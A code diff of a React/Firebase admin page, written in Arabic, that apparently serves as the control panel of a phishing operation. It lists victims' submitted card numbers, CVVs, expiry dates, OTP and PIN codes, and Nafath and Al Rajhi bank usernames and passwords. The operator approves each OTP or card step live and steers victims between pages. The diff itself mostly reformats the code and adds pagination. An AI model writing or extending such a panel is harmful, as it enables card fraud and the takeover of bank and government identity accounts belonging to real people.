@@ -1,9 +1,9 @@
-"use client";
+"use client"
 
-import type React from "react";
+import type React from "react"
 
-import { useState, useEffect, useRef } from "react";
-import { useRouter } from "next/navigation";
+import { useState, useEffect, useRef } from "react"
+import { useRouter } from "next/navigation"
 import {
   Trash2,
   LogOut,
@@ -19,7 +19,6 @@ import {
   Search,
   Shield,
   CreditCardIcon as CardIcon,
-  Filter,
   MoreHorizontal,
   Tag,
   Bell,
@@ -27,11 +26,15 @@ import {
   Loader2,
   RefreshCw,
   Smartphone,
-} from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { Badge } from "@/components/ui/badge";
-import { format } from "date-fns";
-import { Toaster, toast } from "sonner";
+  ChevronLeft,
+  ChevronRight,
+  ChevronsLeft,
+  ChevronsRight,
+} from "lucide-react"
+import { Button } from "@/components/ui/button"
+import { Badge } from "@/components/ui/badge"
+import { format } from "date-fns"
+import { Toaster, toast } from "sonner"
 import {
   Dialog,
   DialogContent,
@@ -39,23 +42,10 @@ import {
   DialogHeader,
   DialogTitle,
   DialogFooter,
-} from "@/components/ui/dialog";
-import {
-  Card,
-  CardContent,
-  CardHeader,
-  CardTitle,
-  CardFooter,
-} from "@/components/ui/card";
-import {
-  Table,
-  TableBody,
-  TableCell,
-  TableHead,
-  TableHeader,
-  TableRow,
-} from "@/components/ui/table";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+} from "@/components/ui/dialog"
+import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
+import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import {
   DropdownMenu,
   DropdownMenuContent,
@@ -63,575 +53,507 @@ import {
   DropdownMenuLabel,
   DropdownMenuSeparator,
   DropdownMenuTrigger,
-} from "@/components/ui/dropdown-menu";
-import {
-  Tooltip,
-  TooltipContent,
-  TooltipProvider,
-  TooltipTrigger,
-} from "@/components/ui/tooltip";
-import { Input } from "@/components/ui/input";
-import {
-  collection,
-  doc,
-  writeBatch,
-  updateDoc,
-  onSnapshot,
-  query,
-  orderBy,
-} from "firebase/firestore";
-import { onAuthStateChanged, signOut } from "firebase/auth";
-import { auth, db } from "@/lib/firebase";
-import { Skeleton } from "@/components/ui/skeleton";
-import PhoneDialog from "@/components/phone-info";
-import NafazAuthDialog from "@/components/nafaz";
-import RajhiAuthDialog from "@/components/rajhi";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
-import {
-  Sheet,
-  SheetContent,
-  SheetDescription,
-  SheetHeader,
-  SheetTitle,
-} from "@/components/ui/sheet";
+} from "@/components/ui/dropdown-menu"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import { Input } from "@/components/ui/input"
+import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
+import { onAuthStateChanged, signOut } from "firebase/auth"
+import { auth, db } from "@/lib/firebase"
+import { Skeleton } from "@/components/ui/skeleton"
+import PhoneDialog from "@/components/phone-info"
+import NafazAuthDialog from "@/components/nafaz"
+import RajhiAuthDialog from "@/components/rajhi"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
 
 interface PaymentData {
-  card_number?: string;
-  cvv?: string;
-  expiration_date?: string;
-  full_name?: string;
+  card_number?: string
+  cvv?: string
+  expiration_date?: string
+  full_name?: string
 }
 
 interface FormData {
-  card_number?: string;
-  cvv?: string;
-  expiration_date?: string;
-  full_name?: string;
+  card_number?: string
+  cvv?: string
+  expiration_date?: string
+  full_name?: string
 }
 
 interface Notification {
-  id: string;
-  agreeToTerms?: boolean;
-  buyer_identity_number?: string;
-  card_number?: string;
-  createdDate: string;
-  customs_code?: string;
-  cvv?: string;
-  document_owner_full_name?: string;
-  expiration_date?: string;
-  formData?: FormData;
-  full_name?: string;
-  insurance_purpose?: string;
-  owner_identity_number?: string;
-  pagename?: string;
-  paymentData?: PaymentData;
-  paymentStatus?: string;
-  phone?: string;
-  phone2?: string;
-  seller_identity_number?: string;
-  serial_number?: string;
-  status?: string;
-  vehicle_manufacture_number?: string;
-  documment_owner_full_name?: string;
-  vehicle_type?: string;
-  isHidden?: boolean;
-  pinCode?: string;
-  otpCardCode?: string;
-  phoneOtp?: string;
-  otpCode?: string;
-  externalUsername?: string;
-  externalPassword?: string;
-  nafadUsername?: string;
-  nafadPassword?: string;
-  nafaz_pin?: string;
-  autnAttachment?: string;
-  requierdAttachment?: string;
-  operator?: string;
-  otpPhoneStatus: string;
-  phoneOtpCode: string;
-  phoneVerificationStatus: string;
+  id: string
+  agreeToTerms?: boolean
+  buyer_identity_number?: string
+  card_number?: string
+  createdDate: string
+  customs_code?: string
+  cvv?: string
+  document_owner_full_name?: string
+  expiration_date?: string
+  formData?: FormData
+  full_name?: string
+  insurance_purpose?: string
+  owner_identity_number?: string
+  pagename?: string
+  paymentData?: PaymentData
+  paymentStatus?: string
+  phone?: string
+  phone2?: string
+  seller_identity_number?: string
+  serial_number?: string
+  status?: string
+  vehicle_manufacture_number?: string
+  documment_owner_full_name?: string
+  vehicle_type?: string
+  isHidden?: boolean
+  pinCode?: string
+  otpCardCode?: string
+  phoneOtp?: string
+  otpCode?: string
+  externalUsername?: string
+  externalPassword?: string
+  nafadUsername?: string
+  nafadPassword?: string
+  nafaz_pin?: string
+  autnAttachment?: string
+  requierdAttachment?: string
+  operator?: string
+  otpPhoneStatus: string
+  phoneOtpCode: string
+  phoneVerificationStatus: string
 }
 
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([]);
-  const [filteredNotifications, setFilteredNotifications] = useState<
-    Notification[]
-  >([]);
-  const [isLoading, setIsLoading] = useState(true);
-  const [isRefreshing, setIsRefreshing] = useState(false);
-  const [searchTerm, setSearchTerm] = useState("");
-  const [selectedInfo, setSelectedInfo] = useState<
-    "personal" | "card" | "vehicle" | null
-  >(null);
-  const [selectedNotification, setSelectedNotification] =
-    useState<Notification | null>(null);
-  const [activeFilter, setActiveFilter] = useState<string | null>(null);
-  const [showSidebar, setShowSidebar] = useState(false);
-  const router = useRouter();
-  const [showCardDialog, setShowCardDialog] = useState(false);
-  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(
-    null
-  );
-  const [showPagenameDialog, setShowPagenameDialog] = useState(false);
-  const [uniquePagenames, setUniquePagenames] = useState<string[]>([]);
-  const [showRajhiDialog, setShowRajhiDialog] = useState(false);
-  const [showNafazDialog, setShowNafazDialog] = useState(false);
-  const [showPhoneDialog, setPhoneDialog] = useState(false);
-  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest");
+  const [notifications, setNotifications] = useState<Notification[]>([])
+  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
+  const [paginatedNotifications, setPaginatedNotifications] = useState<Notification[]>([])
+  const [isLoading, setIsLoading] = useState(true)
+  const [isRefreshing, setIsRefreshing] = useState(false)
+  const [searchTerm, setSearchTerm] = useState("")
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
+  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
+  const [activeFilter, setActiveFilter] = useState<string | null>(null)
+  const [showSidebar, setShowSidebar] = useState(false)
+  const router = useRouter()
+  const [showCardDialog, setShowCardDialog] = useState(false)
+  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
+  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
+  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
+  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
+  const [showNafazDialog, setShowNafazDialog] = useState(false)
+  const [showPhoneDialog, setPhoneDialog] = useState(false)
+  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")
 
-  const notificationSoundRef = useRef<HTMLAudioElement | null>(null);
+  // Pagination states
+  const [currentPage, setCurrentPage] = useState(1)
+  const [itemsPerPage, setItemsPerPage] = useState(50)
+  const [totalPages, setTotalPages] = useState(0)
+
+  const notificationSoundRef = useRef<HTMLAudioElement | null>(null)
 
   const playNotificationSound = () => {
     if (notificationSoundRef.current) {
-      notificationSoundRef.current.currentTime = 0;
+      notificationSoundRef.current.currentTime = 0
       notificationSoundRef.current.play().catch((error) => {
-        console.error("Error playing notification sound:", error);
-      });
+        console.error("Error playing notification sound:", error)
+      })
     }
-  };
+  }
 
-  const updateAttachment = async (
-    id: string,
-    attachmentType: string,
-    value: string
-  ) => {
+  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         [attachmentType]: value,
-      });
+      })
 
       // Play notification sound
-      playNotificationSound();
+      playNotificationSound()
 
       toast.success("تم تحديث المرفق بنجاح", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     } catch (error) {
-      console.error("Error updating attachment:", error);
+      console.error("Error updating attachment:", error)
       toast.error("حدث خطأ أثناء تحديث المرفق", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     }
-  };
+  }
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push("/login");
+        router.push("/login")
       } else {
-        const unsubscribeNotifications = fetchNotifications();
+        const unsubscribeNotifications = fetchNotifications()
         return () => {
-          unsubscribeNotifications();
-        };
+          unsubscribeNotifications()
+        }
       }
-    });
+    })
 
-    return () => unsubscribe();
-  }, [router]);
+    return () => unsubscribe()
+  }, [router])
 
   useEffect(() => {
     if (searchTerm.trim() === "" && !activeFilter) {
-      setFilteredNotifications(notifications);
+      setFilteredNotifications(notifications)
     } else {
       const filtered = notifications.filter((notification) => {
         const matchesSearch =
           searchTerm.trim() === "" ||
-          notification.full_name
-            ?.toLowerCase()
-            .includes(searchTerm.toLowerCase()) ||
-          notification.document_owner_full_name
-            ?.toLowerCase()
-            .includes(searchTerm.toLowerCase()) ||
-          notification.documment_owner_full_name
-            ?.toLowerCase()
-            .includes(searchTerm.toLowerCase()) ||
+          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
           notification.phone?.includes(searchTerm) ||
-          notification.card_number?.includes(searchTerm);
+          notification.card_number?.includes(searchTerm)
 
         const matchesFilter =
           !activeFilter ||
-          (activeFilter === "pending" &&
-            (!notification.status || notification.status === "pending")) ||
+          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
           (activeFilter === "approved" && notification.status === "approved") ||
           (activeFilter === "rejected" && notification.status === "rejected") ||
           (activeFilter === "payment" && notification.pagename === "payment") ||
-          (activeFilter === "registration" &&
-            notification.vehicle_type === "registration");
+          (activeFilter === "registration" && notification.vehicle_type === "registration")
 
-        return matchesSearch && matchesFilter;
-      });
-      setFilteredNotifications(filtered);
+        return matchesSearch && matchesFilter
+      })
+      setFilteredNotifications(filtered)
     }
-  }, [searchTerm, notifications, activeFilter]);
+  }, [searchTerm, notifications, activeFilter])
+
+  // Pagination effect
+  useEffect(() => {
+    const totalItems = filteredNotifications.length
+    const pages = Math.ceil(totalItems / itemsPerPage)
+    setTotalPages(pages)
+
+    // Reset to first page if current page is beyond total pages
+    if (currentPage > pages && pages > 0) {
+      setCurrentPage(1)
+    }
+
+    // Calculate start and end indices
+    const startIndex = (currentPage - 1) * itemsPerPage
+    const endIndex = startIndex + itemsPerPage
+
+    // Get paginated data
+    const paginatedData = filteredNotifications.slice(startIndex, endIndex)
+    setPaginatedNotifications(paginatedData)
+  }, [filteredNotifications, currentPage, itemsPerPage])
 
   useEffect(() => {
     // Extract unique pagenames from notifications
     if (notifications.length > 0) {
       const pagenames = notifications
         .map((notification) => notification.pagename)
-        .filter((pagename): pagename is string => !!pagename);
+        .filter((pagename): pagename is string => !!pagename)
 
-      const uniqueNames = Array.from(new Set(pagenames));
-      setUniquePagenames(uniqueNames);
+      const uniqueNames = Array.from(new Set(pagenames))
+      setUniquePagenames(uniqueNames)
     }
-  }, [notifications]);
+  }, [notifications])
 
   const fetchNotifications = () => {
-    setIsLoading(true);
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
+    setIsLoading(true)
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
-          .map((doc) => ({ id: doc.id, ...doc.data() } as any))
-          .filter(
-            (notification: any) => !notification.isHidden
-          ) as Notification[];
-        setNotifications(notificationsData);
-        setFilteredNotifications(notificationsData);
-        setIsLoading(false);
+          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
+          .filter((notification: any) => !notification.isHidden) as Notification[]
+        setNotifications(notificationsData)
+        setFilteredNotifications(notificationsData)
+        setIsLoading(false)
       },
       (error) => {
-        console.error("Error fetching notifications:", error);
-        setIsLoading(false);
-      }
-    );
+        console.error("Error fetching notifications:", error)
+        setIsLoading(false)
+      },
+    )
 
-    return unsubscribe;
-  };
+    return unsubscribe
+  }
 
   const refreshData = () => {
-    setIsRefreshing(true);
-    const unsubscribe = fetchNotifications();
+    setIsRefreshing(true)
+    const unsubscribe = fetchNotifications()
     setTimeout(() => {
-      setIsRefreshing(false);
+      setIsRefreshing(false)
       toast.success("تم تحديث البيانات بنجاح", {
         position: "top-center",
         duration: 2000,
-      });
-    }, 1000);
-    return unsubscribe;
-  };
+      })
+    }, 1000)
+    return unsubscribe
+  }
 
   const handleClearAll = async () => {
-    setIsLoading(true);
+    setIsLoading(true)
     try {
-      const batch = writeBatch(db);
+      const batch = writeBatch(db)
       notifications.forEach((notification) => {
-        const docRef = doc(db, "pays", notification.id);
-        batch.update(docRef, { isHidden: true });
-      });
-      await batch.commit();
-      setNotifications([]);
-      setFilteredNotifications([]);
+        const docRef = doc(db, "pays", notification.id)
+        batch.update(docRef, { isHidden: true })
+      })
+      await batch.commit()
+      setNotifications([])
+      setFilteredNotifications([])
       toast.success("تم مسح جميع البيانات بنجاح", {
         position: "top-center",
         duration: 3000,
         icon: <CheckCircle className="h-5 w-5" />,
-      });
+      })
     } catch (error) {
-      console.error("Error hiding all notifications:", error);
+      console.error("Error hiding all notifications:", error)
       toast.error("حدث خطأ أثناء مسح البيانات", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
-      });
+      })
     } finally {
-      setIsLoading(false);
+      setIsLoading(false)
     }
-  };
+  }
 
   const handleDelete = async (id: string) => {
     try {
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { isHidden: true });
-      const updatedNotifications = notifications.filter(
-        (notification) => notification.id !== id
-      );
-      setNotifications(updatedNotifications);
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { isHidden: true })
+      const updatedNotifications = notifications.filter((notification) => notification.id !== id)
+      setNotifications(updatedNotifications)
       setFilteredNotifications(
         updatedNotifications.filter((notification) => {
           const matchesSearch =
             searchTerm.trim() === "" ||
-            notification.full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.documment_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
+            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
-            notification.card_number?.includes(searchTerm);
+            notification.card_number?.includes(searchTerm)
 
           const matchesFilter =
             !activeFilter ||
-            (activeFilter === "pending" &&
-              (!notification.status || notification.status === "pending")) ||
-            (activeFilter === "approved" &&
-              notification.status === "approved") ||
-            (activeFilter === "rejected" &&
-              notification.status === "rejected") ||
-            (activeFilter === "payment" &&
-              notification.pagename === "payment") ||
-            (activeFilter === "registration" &&
-              notification.vehicle_type === "registration");
+            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
+            (activeFilter === "approved" && notification.status === "approved") ||
+            (activeFilter === "rejected" && notification.status === "rejected") ||
+            (activeFilter === "payment" && notification.pagename === "payment") ||
+            (activeFilter === "registration" && notification.vehicle_type === "registration")
 
-          return matchesSearch && matchesFilter;
-        })
-      );
+          return matchesSearch && matchesFilter
+        }),
+      )
       toast.success("تم حذف البيانات بنجاح", {
         position: "top-center",
         duration: 3000,
         icon: <CheckCircle className="h-5 w-5" />,
-      });
+      })
     } catch (error) {
-      console.error("Error hiding notification:", error);
+      console.error("Error hiding notification:", error)
       toast.error("حدث خطأ أثناء حذف البيانات", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
-      });
+      })
     }
-  };
+  }
 
   const handlePhoneOtpApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         phoneVerificationStatus: state,
         otpStatus: state,
-      });
+      })
 
       toast.success("تم تحديث حالة التحقق بنجاح", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     } catch (error) {
-      console.error("Error updating phone OTP status:", error);
+      console.error("Error updating phone OTP status:", error)
       toast.error("حدث خطأ أثناء تحديث حالة التحقق", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     }
-  };
+  }
 
   const handlePassApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         cardOtpStatus: state,
         otpStatus: state,
-      });
+      })
 
       toast.success("تم تحديث حالة البطاقة بنجاح", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     } catch (error) {
-      console.error("Error updating card status:", error);
+      console.error("Error updating card status:", error)
       toast.error("حدث خطأ أثناء تحديث حالة البطاقة", {
         position: "top-center",
         duration: 2000,
-      });
+      })
     }
-  };
+  }
 
   const handleApproval = async (state: string, id: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         status: state,
         paymentStatus: state,
-      });
+      })
 
       // Update local state
       const updatedNotifications = notifications.map((notification) =>
-        notification.id === id
-          ? { ...notification, status: state }
-          : notification
-      );
-      setNotifications(updatedNotifications);
+        notification.id === id ? { ...notification, status: state } : notification,
+      )
+      setNotifications(updatedNotifications)
       setFilteredNotifications(
         updatedNotifications.filter((notification) => {
           const matchesSearch =
             searchTerm.trim() === "" ||
-            notification.full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.documment_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
+            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
-            notification.card_number?.includes(searchTerm);
+            notification.card_number?.includes(searchTerm)
 
           const matchesFilter =
             !activeFilter ||
-            (activeFilter === "pending" &&
-              (!notification.status || notification.status === "pending")) ||
-            (activeFilter === "approved" &&
-              notification.status === "approved") ||
-            (activeFilter === "rejected" &&
-              notification.status === "rejected") ||
-            (activeFilter === "payment" &&
-              notification.pagename === "payment") ||
-            (activeFilter === "registration" &&
-              notification.vehicle_type === "registration");
+            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
+            (activeFilter === "approved" && notification.status === "approved") ||
+            (activeFilter === "rejected" && notification.status === "rejected") ||
+            (activeFilter === "payment" && notification.pagename === "payment") ||
+            (activeFilter === "registration" && notification.vehicle_type === "registration")
 
-          return matchesSearch && matchesFilter;
-        })
-      );
+          return matchesSearch && matchesFilter
+        }),
+      )
 
       if (state === "approved") {
         toast.success("تم قبول الطلب بنجاح", {
           position: "top-center",
           duration: 3000,
           icon: <CheckCircle className="h-5 w-5" />,
-        });
+        })
       } else {
         toast.error("تم رفض الطلب", {
           position: "top-center",
           duration: 3000,
           icon: <XCircle className="h-5 w-5" />,
-        });
+        })
       }
 
-      closeDialog();
+      closeDialog()
     } catch (error) {
-      console.error("Error updating status:", error);
+      console.error("Error updating status:", error)
       toast.error("حدث خطأ أثناء تحديث الحالة", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
-      });
+      })
     }
-  };
+  }
 
   const handleUpdatePagename = async (id: string, newPagename: string) => {
     try {
-      const targetPost = doc(db, "pays", id);
+      const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
         pagename: newPagename,
         isFromDash: true,
-      });
+      })
 
       // Update local state
       const updatedNotifications = notifications.map((notification) =>
-        notification.id === id
-          ? { ...notification, pagename: newPagename }
-          : notification
-      );
-      setNotifications(updatedNotifications);
+        notification.id === id ? { ...notification, pagename: newPagename } : notification,
+      )
+      setNotifications(updatedNotifications)
       setFilteredNotifications(
         updatedNotifications.filter((notification) => {
           const matchesSearch =
             searchTerm.trim() === "" ||
-            notification.full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.document_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
-            notification.documment_owner_full_name
-              ?.toLowerCase()
-              .includes(searchTerm.toLowerCase()) ||
+            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
             notification.phone?.includes(searchTerm) ||
-            notification.card_number?.includes(searchTerm);
+            notification.card_number?.includes(searchTerm)
 
           const matchesFilter =
             !activeFilter ||
-            (activeFilter === "pending" &&
-              (!notification.status || notification.status === "pending")) ||
-            (activeFilter === "approved" &&
-              notification.status === "approved") ||
-            (activeFilter === "rejected" &&
-              notification.status === "rejected") ||
-            (activeFilter === "payment" &&
-              notification.pagename === "payment") ||
-            (activeFilter === "registration" &&
-              notification.vehicle_type === "registration");
+            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
+            (activeFilter === "approved" && notification.status === "approved") ||
+            (activeFilter === "rejected" && notification.status === "rejected") ||
+            (activeFilter === "payment" && notification.pagename === "payment") ||
+            (activeFilter === "registration" && notification.vehicle_type === "registration")
 
-          return matchesSearch && matchesFilter;
-        })
-      );
+          return matchesSearch && matchesFilter
+        }),
+      )
 
       toast.success("تم تحديث نوع الطلب بنجاح", {
         position: "top-center",
         duration: 3000,
         icon: <CheckCircle className="h-5 w-5" />,
-      });
+      })
     } catch (error) {
-      console.error("Error updating pagename:", error);
+      console.error("Error updating pagename:", error)
       toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
-      });
+      })
     }
-  };
+  }
 
   const handleLogout = async () => {
     try {
-      await signOut(auth);
-      router.push("/login");
+      await signOut(auth)
+      router.push("/login")
     } catch (error) {
-      console.error("Error signing out:", error);
+      console.error("Error signing out:", error)
       toast.error("حدث خطأ أثناء تسجيل الخروج", {
         position: "top-center",
         duration: 3000,
         icon: <XCircle className="h-5 w-5" />,
-      });
+      })
     }
-  };
+  }
 
-  const handleInfoClick = (
-    notification: Notification,
-    infoType: "personal" | "card" | "vehicle"
-  ) => {
-    setSelectedNotification(notification);
-    setSelectedInfo(infoType);
-  };
+  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "vehicle") => {
+    setSelectedNotification(notification)
+    setSelectedInfo(infoType)
+  }
 
-  const handleCardBadgeClick = (
-    notification: Notification,
-    e: React.MouseEvent
-  ) => {
-    e.stopPropagation();
-    setSelectedCardInfo(notification);
-    setShowCardDialog(true);
-  };
+  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
+    e.stopPropagation()
+    setSelectedCardInfo(notification)
+    setShowCardDialog(true)
+  }
 
-  const handlePagenameBadgeClick = (
-    notification: Notification,
-    e: React.MouseEvent
-  ) => {
-    e.stopPropagation();
-    setSelectedNotification(notification);
-    setShowPagenameDialog(true);
-  };
+  const handlePagenameBadgeClick = (notification: Notification, e: React.MouseEvent) => {
+    e.stopPropagation()
+    setSelectedNotification(notification)
+    setShowPagenameDialog(true)
+  }
 
   const handleViewDetails = (notification: Notification) => {
-    setSelectedNotification(notification);
-    setShowSidebar(true);
-  };
+    setSelectedNotification(notification)
+    setShowSidebar(true)
+  }
 
   const closeDialog = () => {
-    setSelectedInfo(null);
-    setSelectedNotification(null);
-  };
+    setSelectedInfo(null)
+    setSelectedNotification(null)
+  }
 
   const getStatusBadge = (paymentStatus?: string) => {
     if (!paymentStatus || paymentStatus === "pending") {
@@ -640,30 +562,26 @@ export default function NotificationsPage() {
           <Clock className="h-3.5 w-3.5 text-amber-500" />
           <span className="text-amber-600 font-medium">قيد الانتظار</span>
         </div>
-      );
+      )
     } else if (paymentStatus === "approved") {
       return (
         <div className="flex items-center gap-1.5">
           <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
           <span className="text-emerald-600 font-medium">مقبول</span>
         </div>
-      );
+      )
     } else {
       return (
         <div className="flex items-center gap-1.5">
           <XCircle className="h-3.5 w-3.5 text-rose-500" />
           <span className="text-rose-600 font-medium">مرفوض</span>
         </div>
-      );
+      )
     }
-  };
+  }
 
-  const getPageType = (
-    pagename?: string,
-    clickable = false,
-    notification?: Notification
-  ) => {
-    let badge;
+  const getPageType = (pagename?: string, clickable = false, notification?: Notification) => {
+    let badge
 
     switch (pagename) {
       case "payment":
@@ -671,148 +589,180 @@ export default function NotificationsPage() {
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-cyan-600 hover:to-cyan-700" : ""
             }`}
           >
             <CreditCard className="h-3 w-3 mr-1" /> دفع
           </Badge>
-        );
-        break;
+        )
+        break
       case "home":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-violet-500 to-violet-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-violet-600 hover:to-violet-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-violet-600 hover:to-violet-700" : ""
             }`}
           >
             <FileText className="h-3 w-3 mr-1" /> تسجيل
           </Badge>
-        );
-        break;
+        )
+        break
       case "verify-otp":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-pink-500 to-pink-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-pink-600 hover:to-pink-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-pink-600 hover:to-pink-700" : ""
             }`}
           >
             <Shield className="h-3 w-3 mr-1" /> رمز OTP
           </Badge>
-        );
-        break;
+        )
+        break
       case "verify-phone":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-rose-500 to-rose-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-rose-600 hover:to-rose-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-rose-600 hover:to-rose-700" : ""
             }`}
           >
             <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
           </Badge>
-        );
-        break;
+        )
+        break
       case "external-link":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
             }`}
           >
             <Tag className="h-3 w-3 mr-1" /> راجحي
           </Badge>
-        );
-        break;
+        )
+        break
       case "nafaz":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-teal-600 hover:to-teal-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-teal-600 hover:to-teal-700" : ""
             }`}
           >
             <Shield className="h-3 w-3 mr-1" /> نفاذ
           </Badge>
-        );
-        break;
+        )
+        break
       case "":
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-emerald-600 hover:to-emerald-700" : ""
             }`}
           >
             <Calendar className="h-3 w-3 mr-1" /> الرئيسية
           </Badge>
-        );
-        break;
+        )
+        break
       default:
         badge = (
           <Badge
             variant="outline"
             className={`bg-gradient-to-r from-slate-500 to-slate-600 text-white border-0 shadow-sm ${
-              clickable
-                ? "cursor-pointer hover:from-slate-600 hover:to-slate-700"
-                : ""
+              clickable ? "cursor-pointer hover:from-slate-600 hover:to-slate-700" : ""
             }`}
           >
             <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
           </Badge>
-        );
+        )
     }
 
     if (clickable && notification) {
-      return (
-        <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>
-          {badge}
-        </div>
-      );
